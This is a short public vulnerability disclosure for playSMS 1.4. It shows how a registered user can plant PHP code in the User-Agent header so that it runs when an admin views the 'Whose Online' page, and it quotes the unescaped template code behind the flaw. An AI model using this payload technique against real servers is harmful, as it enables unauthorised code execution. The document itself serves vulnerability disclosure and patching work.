# Date: 19-05-2017
# Software Link: https://playsms.org/download/
# Version: 1.4
# Exploit Author: Touhid M.Shaikh
# Contact: http://twitter.com/touhidshaikh22
# Website: http://touhidshaikh.com/
# Category: webapps
  
1. Description
    
 
Remote Code Execution in Admin Log. 
In PlaySMS Admin have a panel where he/she monitor User status. Admin Can see Whose Online.
Using this functionality we can exploit RCE in Whose Online page.
 
When Any user Logged in the playSMS application. Some user details log on Whose Online panel like "Username", "User-Agent", "Current IP", etc. (You Can See Templeate Example Below)    
 
For More Details : www.touhidshaikh.com/blog/
 
    
2. Proof of Concept
  
1) Login as regular user (created using index.php?app=main&inc=core_auth&route=register):
 
2) Just Change you User-agent String to "<?php phpinfo();?>" or whatever your php payload.(Make sure to change User Agent after log in)
 
3) Just surf on playsms. And wait for admin activity, When admin Checks Whose Online status ...(bingooo Your payload successfully exploited )
 
 
 
setting parameter in online.php
*------------------online.php-----------------*
 
$users = report_whoseonline_subuser();
foreach ($users as $user) {
foreach ($user as $hash) {
$tpl[&#039;loops&#039;][&#039;data&#039;][] = array(
&#039;tr_class&#039; => $tr_class,
&#039;c_username&#039; => $hash[&#039;username&#039;],
&#039;c_isadmin&#039; => $hash[&#039;icon_isadmin&#039;],
&#039;last_update&#039; => $hash[&#039;last_update&#039;],
&#039;current_ip&#039; => $hash[&#039;ip&#039;],
&#039;user_agent&#039; => $hash[&#039;http_user_agent&#039;],
&#039;login_status&#039; => $hash[&#039;login_status&#039;],
&#039;action&#039; => $hash[&#039;action_link&#039;],
);
}
}
*-------------ends here online.php-----------------*
 
 
 
 
Visible on this page: report_online.html
*------------report_online.html-----------*
<loop.data>
<tr class={{ data.tr_class }}>
<td>{{ data.c_username }} {{ data.c_isadmin }}</td>
<td>{{ data.login_status }} {{ data.last_update }}</td>
<td>{{ data.current_ip }}</td>
<td>{{ data.user_agent }}</td>
<td>{{ data.action }}</td>
</tr>
</loop.data>
*------------Ends here report_online.html-----------*
 
 
  
  
 
 
*------------------Greetz----------------- -----*
|Pratik K.Tejani, Rehman, Taushif  |
*---------------------------------------------------*
 
  _____           _     _     _ 
 |_   _|__  _   _| |__ (_) __| |
   | |/ _ \| | | | &#039;_ \| |/ _` |
   | | (_) | |_| | | | | | (_| |
   |_|\___/ \__,_|_| |_|_|\__,_|
                                 
Touhid SHaikh
An Independent Security Researcher.

